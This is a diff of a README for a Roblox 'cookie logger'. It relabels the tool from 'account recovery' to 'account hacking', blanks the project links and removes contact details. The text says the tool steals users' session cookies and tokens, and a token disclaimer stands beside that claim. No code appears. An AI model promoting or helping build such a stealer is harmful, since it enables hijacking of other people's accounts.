@@ -3,7 +3,7 @@
 -->
 
 # DISCLAIMER
-This is not to be used for any malicuis intent, I made this purely for a program that detects if you are using an unlicensed version.
+This is not to be used for any malicuis intent, I made this purely for fun (Made By Ibrahim B.)
 
 
 
@@ -17,13 +17,13 @@ This is not to be used for any malicuis intent, I made this purely for a program
   <h3 align="center">CronicCookie</h3>
 
   <p align="center">
-    Smooth and quick cookie logger for account recovery.
+    Smooth and quick cookie logger for account hacking.
     <br />
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger">View Demo</a>
+    <a href="">View Demo</a>
     ·
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Report Bug</a>
+    <a href=">Report Bug</a>
     ·
-    <a href="https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues">Request Feature</a>
+    <a href="">Request Feature</a>
   </p>
 </p>
 
@@ -59,7 +59,7 @@ This is not to be used for any malicuis intent, I made this purely for a program
 
 <!-- ABOUT THE PROJECT -->
 ## About The Project
-Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it.
+Welcome to the newest release of Logged Magma, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it.
 
 
 ### Built With
@@ -121,7 +121,7 @@ This is an example of how to list things you need to use the software and how to
 <!-- ROADMAP -->
 ## Roadmap
 
-See the [open issues](https://github.com/DaEpicSwag/Roblox-Cookie-Logger/issues) for a list of proposed features (and known issues).
+See the [open issues](issues) for a list of proposed features (and known issues).
 
 
 
@@ -147,17 +147,11 @@ Distributed under the MIT License. See `LICENSE` for more information.
 
 <!-- CONTACT -->
 ## Contact
-
-Discord - **@SonicTheHedHog#0001**
-
-Project Link: [Roblox-Cookie-Logger](https://github.com/DaEpicSwag/Roblox-Cookie-Logger)
+Not yet established
 
 
 
-<!-- ACKNOWLEDGEMENTS -->
-## Acknowledgements
 
-* [PogScriptR]() Thanks for the request webhook explaination
 
 
 
